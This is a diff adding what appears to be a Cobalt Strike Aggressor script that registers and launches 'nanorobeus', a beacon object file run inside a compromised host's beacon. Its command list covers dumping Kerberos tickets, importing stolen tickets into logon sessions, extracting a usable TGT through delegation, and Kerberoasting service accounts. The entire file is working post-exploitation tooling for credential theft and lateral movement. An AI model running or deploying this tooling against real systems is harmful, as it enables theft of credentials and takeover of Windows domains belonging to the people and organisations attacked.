@@ -1,0 +1,37 @@
+beacon_command_register(
+    "nanorobeus",
+    "Manage Kerberos tickets",
+    "Command list: \
+        luid\
+            get current logon ID\
+        sessions [/luid:<0x0> | /all]\
+            get logon sessions\
+        klist [/luid:<0x0> | /all]\
+            list Kerberos tickets\
+        dump [/luid:<0x0> | /all]\
+            dump Kerberos tickets\
+        ptt /ticket:<BASE64> [/luid:<0x0>]\
+            import Kerberos ticket into a logon session\
+        purge [/luid:<0x0>]\
+            purge Kerberos tickets\
+        tgtdeleg /spn:<SPN>\
+            retrieve a usable TGT for the current user\
+        kerberoast /spn:<SPN>\
+            perform Kerberoasting against specified SPN\
+        help\
+            print help"
+);
+
+alias nanorobeus {
+    local('$barch $handle $bof $args');
+
+    $barch = barch($1);
+    $handle = openf(script_resource("dist/nanorobeus_cs." . $barch . ".o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($1, "zzzzz", $2, $3, $4, $5, $6);
+    btask($1, "Running nanorobeus");
+
+    beacon_inline_execute($1, $bof, "go", $args);
+}
